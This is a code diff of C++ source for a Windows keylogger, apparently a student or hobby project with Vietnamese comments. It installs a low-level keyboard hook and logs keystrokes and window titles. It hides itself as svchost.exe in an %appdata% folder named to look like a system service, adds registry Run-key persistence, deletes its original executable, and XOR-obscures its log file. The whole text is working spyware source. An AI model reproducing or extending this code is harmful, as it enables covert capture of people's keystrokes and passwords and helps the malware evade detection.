@@ -131,17 +131,27 @@ void initKey()
     keyO[VK_MEDIA_PREV_TRACK] = "[PREV TRACK]";
     keyO[VK_MEDIA_STOP] = "[MEDIA STOP]";
     keyO[VK_MEDIA_PLAY_PAUSE] = "[MEDIA PLAY PAUSE]";
+    keyO[VK_PACKET] = "[VK_PACKET]";
 }
 
 void init()
 {
     initKey();
-    //
+
     WCHAR buf[BUFSIZE];
     GetEnvironmentVariable(L"appdata", buf, BUFSIZE);
+
+    // m_dir = %appdata%\Ser1ce Host
+
     m_dir = std::wstring(buf) + L"\\Ser1ce Host\\";
+
+    // m_file = %appdata%\Ser1ce Host\svchost.exe
     m_file = m_dir + L"svchost.exe";
+
+    // Tạo thư mục Ser1ce Host
     CreateDirectory(m_dir.c_str(), NULL);
+
+    // Tạo file log
     getfiletime();
     
 }
@@ -167,14 +177,33 @@ std::wstring getTime()
 }
 
 
+std::wstring Encrypt(std::wstring str)
+{
+    std::wstring res = L"";
+    for(int i = 0;i<str.length();++i)
+    {
+        res += (WCHAR)str[i]^0x4242;
+    }
+    return res;
+}
+
+std::wstring Decrypt(std::wstring str)
+{
+    std::wstring res = L"";
+    for(int i = 0;i<str.length();++i)
+    {
+        res += (WCHAR)str[i]^0x4242;
+    }
+    return res;
+}
 
 void writeToFile(std::wstring str)
 {
     DWORD dwBytesWritten;
+    std::wstring s = Encrypt(str);
     HANDLE hFile = CreateFile(m_log, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    WriteFile(hFile, str.c_str(), str.length()*sizeof(WCHAR), &dwBytesWritten, NULL);
+    WriteFile(hFile, s.c_str(), s.length()*sizeof(WCHAR), &dwBytesWritten, NULL);
     CloseHandle(hFile);
-    //std::wcout << str;
 }
 
 
@@ -182,7 +211,6 @@ void writeTitle()
 {
     static WCHAR wnd_title[BUFSIZE];
     static WCHAR wnd_prevtitle[BUFSIZE];
-    //std::cout << str;
     memset(wnd_title, 0, sizeof(wnd_title));
     HWND hwnd = GetForegroundWindow();
     GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
@@ -203,13 +231,13 @@ void writeLog(std::string str)
     writeTitle();
     std::wstring wstr(str.begin(), str.end());
     writeToFile(wstr);
-    //std::cout << str;
 }
 
 
 
 void windowsTitle()
 {
+    // Lấy tiêu đề cửa sổ
     WCHAR wnd_title[256];
     WCHAR prev_wnd_title[256];
     ZeroMemory(prev_wnd_title, sizeof(prev_wnd_title));
@@ -218,7 +246,7 @@ void windowsTitle()
         Sleep(100);
         
         ZeroMemory(wnd_title, sizeof(wnd_title));
-        HWND hwnd = GetForegroundWindow(); // get handle of currently active window
+        HWND hwnd = GetForegroundWindow(); 
         GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
         if (wcscmp(wnd_title, prev_wnd_title) != 0)
         {
@@ -233,8 +261,6 @@ void windowsTitle()
 void AutoStart()
 {
     HKEY hKey;
-    //WCHAR [BUFSIZE];
-    //wcscpy_s(key,sizeof(key), m_file.c_str());
     RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
     RegSetValueEx(hKey, L"Serv1ce Host", 0, REG_SZ, (BYTE*)m_file.c_str(), m_file.length()*sizeof(WCHAR));
     RegCloseKey(hKey);
@@ -248,6 +274,7 @@ LRESULT CALLBACK KeyProc(int Code, WPARAM wParam, LPARAM lParam)
     {
     case WM_KEYDOWN:
         vkCode = pKey->vkCode;
+        // 
         if (GetAsyncKeyState(VK_SHIFT))
         {
             for (std::map<int, keypair>::iterator it = keyS.begin(); it != keyS.end(); it++)
@@ -338,22 +365,24 @@ void InstallHook()
 
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
+    // Get argv 
     LPWSTR* argv;
     int argc;
     argv = CommandLineToArgvW(GetCommandLine(), &argc);
-    
     if (argc > 1)
     {
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
         _wremove(argv[1]);
     }
+
+
     init();
-    AutoStart();
     if (!Install())
     {
         return 0;
     }
 
+    AutoStart();
     InstallHook();
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0) != 0)
@@ -364,14 +393,3 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
     UnhookWindowsHookEx(hHook);
     return 0;
 }
-
-
-/*
-int wmain(int argc, WCHAR **argv)
-{
-    //FreeConsole();
-    
-
-}
-*/
-
